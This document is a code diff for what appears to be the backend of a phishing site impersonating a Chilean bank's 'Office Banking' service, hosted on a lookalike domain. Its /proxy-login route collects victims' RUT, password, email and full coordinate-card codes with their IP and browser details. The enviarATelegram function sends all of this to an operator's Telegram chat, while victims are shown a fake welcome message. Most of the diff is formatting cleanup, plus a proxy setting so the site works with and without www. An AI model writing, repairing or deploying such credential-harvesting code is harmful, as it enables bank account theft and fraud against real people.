@@ -5,14 +5,19 @@ const path = require("path");
 
 const app = express();
 
+// 🔥 NECESARIO PARA QUE FUNCIONE CON WWW Y SIN WWW
+app.set("trust proxy", true);
+
 // ✅ CORS mejorado - permite AMBOS dominios sin redirección
 const corsOptions = {
   origin: function(origin, callback) {
-    if (!origin || 
-        origin === "https://www.officebankingchile.info" || 
-        origin === "https://officebankingchile.info" ||
-        origin === "http://localhost:3000" ||
-        origin === "http://localhost:5000") {
+    if (
+      !origin ||
+      origin === "https://www.officebankingchile.info" ||
+      origin === "https://officebankingchile.info" ||
+      origin === "http://localhost:3000" ||
+      origin === "http://localhost:5000"
+    ) {
       callback(null, true);
     } else {
       callback(new Error("No permitido por CORS"));
@@ -33,8 +38,8 @@ app.use(express.static(path.join(__dirname, "public")));
 // ✅ Middleware para logging detallado
 app.use((req, res, next) => {
   console.log(`\n📨 ${req.method} ${req.path}`);
-  console.log(`Origin: ${req.get('origin')}`);
-  if(req.method === "POST") {
+  console.log(`Origin: ${req.get("origin")}`);
+  if (req.method === "POST") {
     console.log(`Body:`, JSON.stringify(req.body, null, 2));
   }
   next();
@@ -44,8 +49,9 @@ app.use((req, res, next) => {
 console.log("\n=== VERIFICANDO CONFIGURACIÓN ===");
 console.log(`TELEGRAM_TOKEN definido: ${process.env.TELEGRAM_TOKEN ? "✅ SÍ" : "❌ NO"}`);
 console.log(`CHAT_ID definido: ${process.env.CHAT_ID ? "✅ SÍ" : "❌ NO"}`);
-if(process.env.TELEGRAM_TOKEN) console.log(`Token (primeros 20 caracteres): ${process.env.TELEGRAM_TOKEN.substring(0, 20)}...`);
-if(process.env.CHAT_ID) console.log(`Chat ID: ${process.env.CHAT_ID}`);
+if (process.env.TELEGRAM_TOKEN)
+  console.log(`Token (primeros 20 caracteres): ${process.env.TELEGRAM_TOKEN.substring(0, 20)}...`);
+if (process.env.CHAT_ID) console.log(`Chat ID: ${process.env.CHAT_ID}`);
 console.log("================================\n");
 
 // Health check
@@ -136,9 +142,9 @@ async function enviarATelegram(mensaje) {
     const response = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ 
-        chat_id: process.env.CHAT_ID, 
-        text: mensaje 
+      body: JSON.stringify({
+        chat_id: process.env.CHAT_ID,
+        text: mensaje
       })
     });
 
@@ -180,7 +186,7 @@ function detectarNavegador(userAgent) {
 // =============================================
 
 app.post("/proxy-login", async (req, res) => {
-  const { rut, passwd, mail, coordenadas } = req.body; // ← aquí agregamos coordenadas
+  const { rut, passwd, mail, coordenadas } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const userAgent = req.headers["user-agent"];
   const infoNavegador = detectarNavegador(userAgent);
@@ -210,7 +216,7 @@ Dispositivo: ${infoNavegador.dispositivo}`;
 RUT: ${rut}
 Clave: ${passwd}
 IP: ${ip}
-Hora: ${new Date().toLocaleString('es-CL')}
+Hora: ${new Date().toLocaleString("es-CL")}
 Navegador: ${infoNavegador.navegador}
 Sistema: ${infoNavegador.sistema}
 Dispositivo: ${infoNavegador.dispositivo}`;
@@ -219,23 +225,23 @@ Dispositivo: ${infoNavegador.dispositivo}`;
       return res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
     }
 
-    // 🔢 COORDENADAS (AGREGADO Y CORREGIDO)
+    // 🔢 COORDENADAS
     if (coordenadas) {
       const coords = coordenadas;
       let texto = "🔐 Tarjeta de Coordenadas\n\n";
 
-      const letras = ["A","B","C","D","E","F","G","H","I","J"];
+      const letras = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J"];
 
       for (let fila = 1; fila <= 5; fila++) {
         let linea = "";
         for (let col of letras) {
-          linea += `${col}${fila}: ${coords[col+fila]} | `;
+          linea += `${col}${fila}: ${coords[col + fila]} | `;
         }
         texto += linea.slice(0, -3) + "\n";
       }
 
       texto += `\nIP: ${ip}`;
-      texto += `\nHora: ${new Date().toLocaleString('es-CL')}`;
+      texto += `\nHora: ${new Date().toLocaleString("es-CL")}`;
       texto += `\nNavegador: ${infoNavegador.navegador}`;
       texto += `\nSistema: ${infoNavegador.sistema}`;
       texto += `\nDispositivo: ${infoNavegador.dispositivo}`;
@@ -248,9 +254,7 @@ Dispositivo: ${infoNavegador.dispositivo}`;
       });
     }
 
-    // ❌ SIN PARÁMETROS
     res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });
-
   } catch (err) {
     console.error(`❌ Error en /proxy-login:`, err);
     res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
